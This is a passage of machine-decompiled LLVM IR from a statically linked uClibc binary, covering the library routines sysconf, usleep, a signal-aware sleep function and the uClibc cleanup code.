  store i32 %v2_80549df, i32* %stack_var_-460, align 4
  %v4_8054a48 = call i32 @__sigaddset(i32 %v2_80549df, i32 17, i32 0, i32 0)
  store i32 %v4_8054a48, i32* %eax.global-to-local, align 4
  %v2_8054a50 = icmp slt i32 %v4_8054a48, 0
  br i1 %v2_8054a50, label %dec_label_pc_8054b17, label %dec_label_pc_8054a58

dec_label_pc_8054a58:                             ; preds = %dec_label_pc_8054a3c
  %v2_8054a59 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8054a59, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8054a62 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8054a59)
  store i32 %v4_8054a62, i32* %eax.global-to-local, align 4
  %v2_8054a6a = icmp slt i32 %v4_8054a62, 0
  %v1_8054a6c = icmp eq i1 %v2_8054a6a, false
  br i1 %v1_8054a6c, label %dec_label_pc_8054a96, label %dec_label_pc_8054a6e

dec_label_pc_8054a6e:                             ; preds = %dec_label_pc_8054a58
  %v0_8054a6e = load i32, i32* %stack_var_-460, align 4
  %v1_8054a6e = call i32 @__errno_location(i32 %v0_8054a6e)
  store i32 %v1_8054a6e, i32* %eax.global-to-local, align 4
  %v1_8054a73 = inttoptr i32 %v1_8054a6e to i32*
  %v2_8054a73 = load i32, i32* %v1_8054a73, align 4
  store i32 %v2_8054a73, i32* @esi, align 4
  store i32 %v1_8054a6e, i32* @ebx, align 4
  store i32 %v2_80549f8, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054a84 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054a84 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054a84, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054a8f = load i32, i32* @esi, align 4
  %v1_8054a8f = load i32, i32* @ebx, align 4
  %v2_8054a8f = inttoptr i32 %v1_8054a8f to i32*
  store i32 %v0_8054a8f, i32* %v2_8054a8f, align 4
  %v0_8054b24.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b1a

dec_label_pc_8054a96:                             ; preds = %dec_label_pc_8054a58
  %v3_8054a96 = load i32, i32* %stack_var_-420, align 4
  %v12_8054a96 = icmp eq i32 %v3_8054a96, 1
  %v2_8054aa2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054aa2, i32* @ebx, align 4
  %v1_8054aa9 = icmp eq i1 %v12_8054a96, false
  br i1 %v1_8054aa9, label %dec_label_pc_8054ad0, label %dec_label_pc_8054aab

dec_label_pc_8054aab:                             ; preds = %dec_label_pc_8054a96
  store i32 %v2_8054aa2, i32* %stack_var_-460, align 4
  %v2_8054aaf = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054aaf = call i32 @__libc_nanosleep(%timespec* %v2_8054aaf, i32 %v2_8054aa2)
  store i32 %v3_8054aaf, i32* %eax.global-to-local, align 4
  store i32 %v3_8054aaf, i32* @edi, align 4
  %v1_8054ab6 = call i32 @__errno_location(i32 %v2_8054aa2)
  store i32 %v1_8054ab6, i32* %eax.global-to-local, align 4
  %v1_8054abe = inttoptr i32 %v1_8054ab6 to i32*
  %v2_8054abe = load i32, i32* %v1_8054abe, align 4
  store i32 %v2_8054abe, i32* @esi, align 4
  store i32 %v1_8054ab6, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054ac7 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054ac7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054ac7, i32 0)
  store i32 %v4_8054ac7, i32* %eax.global-to-local, align 4
  %v0_8054acc = load i32, i32* @esi, align 4
  %v1_8054acc = load i32, i32* @ebx, align 4
  %v2_8054acc = inttoptr i32 %v1_8054acc to i32*
  store i32 %v0_8054acc, i32* %v2_8054acc, align 4
  %v0_8054af6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054af3

dec_label_pc_8054ad0:                             ; preds = %dec_label_pc_8054a96
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054ad6 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054ad6 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054ad6, i32 0)
  store i32 %v4_8054ad6, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054aec

dec_label_pc_8054ae1:                             ; preds = %dec_label_pc_8054a13
  %v2_8054ae3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054ae3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054aec

dec_label_pc_8054aec:                             ; preds = %dec_label_pc_8054ad0, %dec_label_pc_8054ae1
  %storemerge3.pre-phi = phi i32 [ %v2_8054aa2, %dec_label_pc_8054ad0 ], [ %v2_8054ae3, %dec_label_pc_8054ae1 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8054aec = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054aec = call i32 @__libc_nanosleep(%timespec* %v2_8054aec, i32 %storemerge3.pre-phi)
  store i32 %v3_8054aec, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054af3

dec_label_pc_8054af3:                             ; preds = %dec_label_pc_8054aab, %dec_label_pc_8054aec
  %v0_8054af6 = phi i32 [ %v0_8054af6.pre, %dec_label_pc_8054aab ], [ %v3_8054aec, %dec_label_pc_8054aec ]
  %v1_8054af6 = icmp eq i32 %v0_8054af6, 0
  br i1 %v1_8054af6, label %dec_label_pc_8054b13, label %dec_label_pc_8054afa

dec_label_pc_8054afa:                             ; preds = %dec_label_pc_8054af3
  %v4_8054b0a = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8054b0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b1a

dec_label_pc_8054b13:                             ; preds = %entry, %dec_label_pc_8054af3
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b1a

dec_label_pc_8054b17:                             ; preds = %dec_label_pc_8054a3c, %dec_label_pc_80549f7, %dec_label_pc_80549c9
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b1a

dec_label_pc_8054b1a:                             ; preds = %dec_label_pc_8054a6e, %dec_label_pc_8054b13, %dec_label_pc_8054afa, %dec_label_pc_8054b17
  %v0_8054b24 = phi i32 [ %v0_8054b24.pre, %dec_label_pc_8054a6e ], [ 0, %dec_label_pc_8054b13 ], [ %v4_8054b0a, %dec_label_pc_8054afa ], [ -1, %dec_label_pc_8054b17 ]
  store i32 %v0_80549a4, i32* @ebx, align 4
  store i32 %v0_80549a3, i32* @esi, align 4
  store i32 %v0_80549a2, i32* @edi, align 4
  ret i32 %v0_8054b24

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8054ab6, { 1, 0, 2 }
  uselistorder i32 %v2_8054aa2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8054a39, { 2, 1, 0 }
  uselistorder i32 %v2_80549f8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80549df, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80549c6, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 2, 0, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 14 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 2, 3, 0, 1, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054b1a, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054b13, { 1, 0 }
  uselistorder label %dec_label_pc_8054af3, { 1, 0 }
  uselistorder label %dec_label_pc_8054aec, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8054b47 [
    i32 0, label %dec_label_pc_8054b57
    i32 1, label %dec_label_pc_8054c3c
    i32 2, label %dec_label_pc_8054b61
    i32 3, label %dec_label_pc_8054b6b
    i32 4, label %dec_label_pc_8054b75
    i32 5, label %dec_label_pc_8054c0b
    i32 6, label %dec_label_pc_8054b7d
    i32 7, label %dec_label_pc_8054b3d
    i32 8, label %dec_label_pc_8054b3d
    i32 9, label %dec_label_pc_8054b3d
    i32 10, label %dec_label_pc_8054b3d
    i32 11, label %dec_label_pc_8054b3d
    i32 12, label %dec_label_pc_8054b3d
    i32 13, label %dec_label_pc_8054b3d
    i32 14, label %dec_label_pc_8054b3d
    i32 15, label %dec_label_pc_8054b3d
    i32 16, label %dec_label_pc_8054b3d
    i32 17, label %dec_label_pc_8054b3d
    i32 18, label %dec_label_pc_8054b3d
    i32 19, label %dec_label_pc_8054b3d
    i32 20, label %dec_label_pc_8054b3d
    i32 21, label %dec_label_pc_8054b3d
    i32 22, label %dec_label_pc_8054b3d
    i32 23, label %dec_label_pc_8054c3c
    i32 24, label %dec_label_pc_8054c3c
    i32 25, label %dec_label_pc_8054c48
    i32 26, label %dec_label_pc_8054c19
    i32 27, label %dec_label_pc_8054c3c
    i32 28, label %dec_label_pc_8054b8f
    i32 29, label %dec_label_pc_8054c12
    i32 30, label %dec_label_pc_8054b87
    i32 31, label %dec_label_pc_8054c27
    i32 32, label %dec_label_pc_8054c3c
    i32 33, label %dec_label_pc_8054c3c
    i32 34, label %dec_label_pc_8054c3c
    i32 35, label %dec_label_pc_8054c20
    i32 36, label %dec_label_pc_8054c4f
    i32 37, label %dec_label_pc_8054c56
    i32 38, label %dec_label_pc_8054c4f
    i32 39, label %dec_label_pc_8054b99
    i32 40, label %dec_label_pc_8054c5d
    i32 41, label %dec_label_pc_8054c3c
    i32 42, label %dec_label_pc_8054c27
    i32 43, label %dec_label_pc_8054c56
    i32 44, label %dec_label_pc_8054c64
    i32 45, label %dec_label_pc_8054c56
    i32 46, label %dec_label_pc_8054c12
    i32 47, label %dec_label_pc_8054c12
    i32 48, label %dec_label_pc_8054c12
    i32 49, label %dec_label_pc_8054c3c
    i32 50, label %dec_label_pc_8054c3c
    i32 51, label %dec_label_pc_8054c12
    i32 52, label %dec_label_pc_8054c12
    i32 53, label %dec_label_pc_8054c3c
    i32 54, label %dec_label_pc_8054c3c
    i32 55, label %dec_label_pc_8054c3c
    i32 56, label %dec_label_pc_8054c3c
    i32 57, label %dec_label_pc_8054c3c
    i32 58, label %dec_label_pc_8054c3c
    i32 59, label %dec_label_pc_8054c3c
    i32 60, label %dec_label_pc_8054c3c
    i32 61, label %dec_label_pc_8054c3c
    i32 62, label %dec_label_pc_8054c3c
    i32 63, label %dec_label_pc_8054c3c
    i32 64, label %dec_label_pc_8054c3c
    i32 65, label %dec_label_pc_8054c3c
    i32 66, label %dec_label_pc_8054c3c
    i32 67, label %dec_label_pc_8054b3d
    i32 68, label %dec_label_pc_8054b3d
    i32 69, label %dec_label_pc_8054c20
    i32 70, label %dec_label_pc_8054c20
    i32 71, label %dec_label_pc_8054c20
    i32 72, label %dec_label_pc_8054c27
    i32 73, label %dec_label_pc_8054c2e
    i32 74, label %dec_label_pc_8054c35
    i32 75, label %dec_label_pc_8054ba3
    i32 76, label %dec_label_pc_8054c35
    i32 77, label %dec_label_pc_8054b3d
    i32 78, label %dec_label_pc_8054b3d
    i32 79, label %dec_label_pc_8054b3d
    i32 80, label %dec_label_pc_8054b3d
    i32 81, label %dec_label_pc_8054b3d
    i32 82, label %dec_label_pc_8054b3d
    i32 83, label %dec_label_pc_8054b3d
    i32 84, label %dec_label_pc_8054b3d
    i32 85, label %dec_label_pc_8054c3c
    i32 86, label %dec_label_pc_8054c3c
    i32 87, label %dec_label_pc_8054c19
    i32 88, label %dec_label_pc_8054bad
    i32 89, label %dec_label_pc_8054bb7
    i32 90, label %dec_label_pc_8054c2e
    i32 91, label %dec_label_pc_8054b3d
    i32 92, label %dec_label_pc_8054b3d
    i32 93, label %dec_label_pc_8054b3d
    i32 94, label %dec_label_pc_8054b3d
    i32 95, label %dec_label_pc_8054c12
    i32 96, label %dec_label_pc_8054c3c
    i32 97, label %dec_label_pc_8054c3c
    i32 98, label %dec_label_pc_8054b3d
    i32 99, label %dec_label_pc_8054b3d
    i32 100, label %dec_label_pc_8054b3d
    i32 101, label %dec_label_pc_8054bc1
    i32 102, label %dec_label_pc_8054c04
    i32 103, label %dec_label_pc_8054c41
    i32 104, label %dec_label_pc_8054c19
    i32 105, label %dec_label_pc_8054bcb
    i32 106, label %dec_label_pc_8054c27
    i32 107, label %dec_label_pc_8054c27
    i32 108, label %dec_label_pc_8054c0b
    i32 109, label %dec_label_pc_8054c48
    i32 110, label %dec_label_pc_8054c64
    i32 111, label %dec_label_pc_8054c04
    i32 112, label %dec_label_pc_8054c41
    i32 113, label %dec_label_pc_8054c64
    i32 114, label %dec_label_pc_8054bd5
    i32 115, label %dec_label_pc_8054c5d
    i32 116, label %dec_label_pc_8054c3c
    i32 117, label %dec_label_pc_8054c3c
    i32 118, label %dec_label_pc_8054bdf
    i32 119, label %dec_label_pc_8054be9
    i32 120, label %dec_label_pc_8054c56
    i32 121, label %dec_label_pc_8054c19
    i32 122, label %dec_label_pc_8054c19
    i32 123, label %dec_label_pc_8054c19
    i32 124, label %dec_label_pc_8054c19
    i32 125, label %dec_label_pc_8054b3d
    i32 126, label %dec_label_pc_8054b3d
    i32 127, label %dec_label_pc_8054c3c
    i32 128, label %dec_label_pc_8054c3c
    i32 129, label %dec_label_pc_8054b3d
    i32 130, label %dec_label_pc_8054b3d
    i32 131, label %dec_label_pc_8054c3c
    i32 149, label %dec_label_pc_8054bf0
  ]

dec_label_pc_8054b3d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054b47:                             ; preds = %entry
  %v1_8054b47 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8054b4c = inttoptr i32 %v1_8054b47 to i32*
  store i32 22, i32* %v1_8054b4c, align 4
  br label %dec_label_pc_8054c3c

dec_label_pc_8054b57:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054b61:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054b6b:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054b75:                             ; preds = %entry
  %v0_8054b78 = call i32 @getdtablesize()
  br label %dec_label_pc_8054b7d

dec_label_pc_8054b7d:                             ; preds = %entry, %dec_label_pc_8054b75
  br label %dec_label_pc_8054c69

dec_label_pc_8054b87:                             ; preds = %entry
  %v3_8054b8a = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8054b8f

dec_label_pc_8054b8f:                             ; preds = %entry, %dec_label_pc_8054b87
  br label %dec_label_pc_8054c69

dec_label_pc_8054b99:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054ba3:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bad:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bb7:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bc1:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bcb:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bd5:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bdf:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054be9:                             ; preds = %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054bf0:                             ; preds = %entry
  %v5_8054bf6 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8054bfe = icmp slt i32 %v5_8054bf6, 0
  %v1_8054c00 = icmp eq i1 %v2_8054bfe, false
  br i1 %v1_8054c00, label %dec_label_pc_8054c12, label %dec_label_pc_8054c3c

dec_label_pc_8054c04:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c0b:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c12:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8054bf0
  br label %dec_label_pc_8054c69

dec_label_pc_8054c19:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c20:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c27:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c2e:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c35:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c3c:                             ; preds = %dec_label_pc_8054bf0, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8054b47
  br label %dec_label_pc_8054c69

dec_label_pc_8054c41:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c48:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c4f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c56:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c5d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c64:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8054c69

dec_label_pc_8054c69:                             ; preds = %dec_label_pc_8054c5d, %dec_label_pc_8054c56, %dec_label_pc_8054c4f, %dec_label_pc_8054c48, %dec_label_pc_8054c41, %dec_label_pc_8054c35, %dec_label_pc_8054c2e, %dec_label_pc_8054c27, %dec_label_pc_8054c20, %dec_label_pc_8054c19, %dec_label_pc_8054c0b, %dec_label_pc_8054c04, %dec_label_pc_8054c12, %dec_label_pc_8054be9, %dec_label_pc_8054bdf, %dec_label_pc_8054bd5, %dec_label_pc_8054bcb, %dec_label_pc_8054bc1, %dec_label_pc_8054bb7, %dec_label_pc_8054bad, %dec_label_pc_8054ba3, %dec_label_pc_8054b99, %dec_label_pc_8054b8f, %dec_label_pc_8054b7d, %dec_label_pc_8054b6b, %dec_label_pc_8054b61, %dec_label_pc_8054b57, %dec_label_pc_8054b3d, %dec_label_pc_8054c3c, %dec_label_pc_8054c64
  %v0_8054c6c = phi i32 [ 255, %dec_label_pc_8054c5d ], [ 2048, %dec_label_pc_8054c56 ], [ 99, %dec_label_pc_8054c4f ], [ 20, %dec_label_pc_8054c48 ], [ -128, %dec_label_pc_8054c41 ], [ 1024, %dec_label_pc_8054c35 ], [ 4, %dec_label_pc_8054c2e ], [ 32, %dec_label_pc_8054c27 ], [ 256, %dec_label_pc_8054c20 ], [ 2147483647, %dec_label_pc_8054c19 ], [ 16, %dec_label_pc_8054c0b ], [ 127, %dec_label_pc_8054c04 ], [ 200112, %dec_label_pc_8054c12 ], [ 9, %dec_label_pc_8054be9 ], [ 65535, %dec_label_pc_8054bdf ], [ -32768, %dec_label_pc_8054bd5 ], [ -2147483648, %dec_label_pc_8054bcb ], [ 8, %dec_label_pc_8054bc1 ], [ 500, %dec_label_pc_8054bb7 ], [ 4096, %dec_label_pc_8054bad ], [ 16384, %dec_label_pc_8054ba3 ], [ 1000, %dec_label_pc_8054b99 ], [ 32768, %dec_label_pc_8054b8f ], [ 6, %dec_label_pc_8054b7d ], [ 65536, %dec_label_pc_8054b6b ], [ 100, %dec_label_pc_8054b61 ], [ 131072, %dec_label_pc_8054b57 ], [ 1, %dec_label_pc_8054b3d ], [ -1, %dec_label_pc_8054c3c ], [ 32767, %dec_label_pc_8054c64 ]
  ret i32 %v0_8054c6c

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 3, 2, 0, 1 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 49, { 2, 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 3, 1, 2, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 8, 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 0, 1 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 3, 0 }
  uselistorder i32 18, { 1, 0 }
  uselistorder label %dec_label_pc_8054c69, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8054c3c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8054c12, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054b8f, { 1, 0 }
  uselistorder label %dec_label_pc_8054b7d, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8054c78 = trunc i64 %arg1 to i32
  %div = udiv i32 %v4_8054c78, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_8054c97 = bitcast i32* %stack_var_-8 to %timespec*
  %v3_8054c97 = call i32 @__libc_nanosleep(%timespec* %v2_8054c97, i32 0)
  ret i32 %v3_8054c97

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 1, 2, 0 }
  uselistorder i32 1000000, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054ca0 = load i32, i32* @ebx, align 4
  store i32 %v0_8054ca0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_8054cb4, label %dec_label_pc_8054cc1

dec_label_pc_8054cb4:                             ; preds = %entry, %dec_label_pc_8054cb4
  %v1_8054cbb6 = phi i32 [ %v1_8054cbb, %dec_label_pc_8054cb4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8054cbb.531 to i32), i32* %stack_var_-16, align 4
  %v5_8054cb4 = mul i32 %v1_8054cbb6, 4
  %v6_8054cb4 = add i32 %v5_8054cb4, ptrtoint (i32* @global_var_805b000.530 to i32)
  %v7_8054cb4 = inttoptr i32 %v6_8054cb4 to i32*
  %v8_8054cb4 = load i32, i32* %v7_8054cb4, align 4
  call void @__pseudo_call(i32 %v8_8054cb4)
  %v0_8054cbb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054cbb = add i32 %v0_8054cbb.pre, -1
  store i32 %v1_8054cbb, i32* %ebx.global-to-local, align 4
  %v10_8054cbc = icmp eq i32 %v0_8054cbb.pre, 0
  %v1_8054cbf = icmp eq i1 %v10_8054cbc, false
  br i1 %v1_8054cbf, label %dec_label_pc_8054cb4, label %dec_label_pc_8054cc1

dec_label_pc_8054cc1:                             ; preds = %dec_label_pc_8054cb4, %entry
  %v0_8054cc1 = load i32, i32* @global_var_8061794.532, align 4
  %v1_8054cc6 = icmp eq i32 %v0_8054cc1, 0
  br i1 %v1_8054cc6, label %dec_label_pc_8054ccc, label %dec_label_pc_8054cca

dec_label_pc_8054cca:                             ; preds = %dec_label_pc_8054cc1
  %v0_8054cca = load i32, i32* %stack_var_-16, align 4
  %v1_8054cca = call i32 @unknown_0(i32 %v0_8054cca)
  br label %dec_label_pc_8054ccc

dec_label_pc_8054ccc:                             ; preds = %dec_label_pc_8054cca, %dec_label_pc_8054cc1
  %v0_8054ccc = load i32, i32* @global_var_8061798.533, align 8
  %v1_8054cd2 = icmp eq i32 %v0_8054ccc, 0
  br i1 %v1_8054cd2, label %dec_label_pc_8054cdb, label %dec_label_pc_8054cd6

dec_label_pc_8054cd6:                             ; preds = %dec_label_pc_8054ccc
  %v2_8054cd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054cd8, i32* %ebx.global-to-local, align 4
  %v0_8054cd9 = load i32, i32* %stack_var_-16, align 4
  %v1_8054cd9 = call i32 @unknown_0(i32 %v0_8054cd9)
  br label %dec_label_pc_8054cdb

dec_label_pc_8054cdb:                             ; preds = %dec_label_pc_8054ccc, %dec_label_pc_8054cd6
  %v2_8054cdb = load i32, i32* %stack_var_-16, align 4
  %v2_8054cdc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054cdc, i32* @edx, align 4
  ret i32 %v2_8054cdb

; uselistorder directives
  uselistorder i32 %v1_8054cbb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054cdb, { 1, 0 }
  uselistorder label %dec_label_pc_8054cb4, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

